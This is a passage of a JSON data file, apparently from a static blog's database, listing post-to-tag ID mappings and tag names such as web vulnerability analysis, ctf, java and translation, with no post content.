s26aqqk","_id":"ckgrozuac0065wsa93q5uejo1"},{"post_id":"ckgrozua9005mwsa9ee89bcma","tag_id":"ckgrozu8u001vwsa94b9wc9do","_id":"ckgrozuac0066wsa9byxzat2k"},{"post_id":"ckgrozua9005pwsa92hxxbgeh","tag_id":"ckgrozu8u001vwsa94b9wc9do","_id":"ckgrozuac0067wsa9a4xjh21r"},{"post_id":"ckgrozuaa005swsa9a6bm4bi9","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozuac0068wsa9erune8sg"},{"post_id":"ckgrozuai0069wsa96mdwdqgn","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuaj006bwsa9afj6f10f"},{"post_id":"ckgrozuai0069wsa96mdwdqgn","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozuak006ewsa929bcbvhv"},{"post_id":"ckgrozuaj006cwsa9hu383w8w","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozual006hwsa97u8e66fs"},{"post_id":"ckgrozuak006fwsa94lzl1m4k","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozual006kwsa9hje993bo"},{"post_id":"ckgrozual006iwsa9627q0p8l","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuam006nwsa905171efu"},{"post_id":"ckgrozuai006awsa9c6l38sr7","tag_id":"ckgrozuak006dwsa9438dhfr3","_id":"ckgrozuan006pwsa9664y90hr"},{"post_id":"ckgrozuam006lwsa99qir9cj9","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuan006rwsa9b0tbcuiv"},{"post_id":"ckgw22dqk0000eca99cub1zmh","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgw22dqv0001eca9c0v8gue5"},{"post_id":"ckh0bgtro0000z4a91rcphbgx","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckh0bgtrz0001z4a90kphesfn"},{"post_id":"cki8h7236000014a967qq71k4","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"cki8h723i000114a9fvqa78sy"},{"post_id":"ckizdlr2f000034a93yuwcez8","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckizdlr2r000134a9ev1qg8e8"}],"Tag":[{"name":"web漏洞分析","_id":"ckgrozu800005wsa9fs26aqqk"},{"name":"杂文","_id":"ckgrozu86000dwsa975is5ivr"},{"name":"java","_id":"ckgrozu8g000twsa9ekg70xk6"},{"name":"ctf","_id":"ckgrozu8j0010wsa949ze45ws"},{"name":"翻译","_id":"ckgrozu8u001vwsa94b9wc9do"},{"name":"漏洞分析","_id":"ckgrozu9f003kwsa9ft7mbmtn"},{"name":"技术分享","_id":"ckgrozu9m003xwsa9532gbvx9"},{"name":"windows漏洞分析","_id":"ckgrozuak006dwsa9438dhfr3"}]}}